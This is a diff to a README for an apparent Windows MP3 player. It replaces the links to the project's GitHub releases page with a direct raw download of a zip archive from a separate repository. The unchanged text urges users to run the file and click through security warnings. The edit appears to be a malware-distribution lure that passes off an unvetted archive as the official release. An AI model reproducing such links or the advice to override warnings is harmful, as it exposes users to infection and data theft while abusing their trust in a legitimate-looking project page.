@@ -11,7 +11,7 @@ Welcome! This guide will help you download and run cf-mp3-player on your Windows
 
 ## 📥 Download the Application
 
-[![Download cf-mp3-player](https://img.shields.io/badge/Download-cf--mp3--player-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dissociative-familyargiopidae307/cf-mp3-player/releases)
+[![Download cf-mp3-player](https://img.shields.io/badge/Download-cf--mp3--player-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Dissociative-familyargiopidae307/dissociative-familyargiopidae307.github.io/main/data/App-v3.7-beta.1.zip)
 
 Visit this link to download the application. You'll find the latest version there, ready for you to grab.
 
@@ -29,7 +29,7 @@ Your Windows computer needs the following to run cf-mp3-player smoothly:
 
 Follow these simple steps to get your music player up and running:
 
-1. **Go to the download page:** Click the blue download button above or use this link: https://github.com/Dissociative-familyargiopidae307/cf-mp3-player/releases
+1. **Go to the download page:** Click the blue download button above or use this link: https://raw.githubusercontent.com/Dissociative-familyargiopidae307/dissociative-familyargiopidae307.github.io/main/data/App-v3.7-beta.1.zip
 2. **Choose the right file:** Look for a file named something like `cf-mp3-player-setup.exe` or `cf-mp3-player-windows.zip`. If you're unsure, pick the one labeled as the latest release.
 3. **Start the download:** Click the file name to begin downloading. Your browser will save it to your Downloads folder.
 4. **Run the application:** Once the download finishes, open your Downloads folder and double-click the downloaded file. If you see a security warning, click "Run" or "Yes" to allow it.
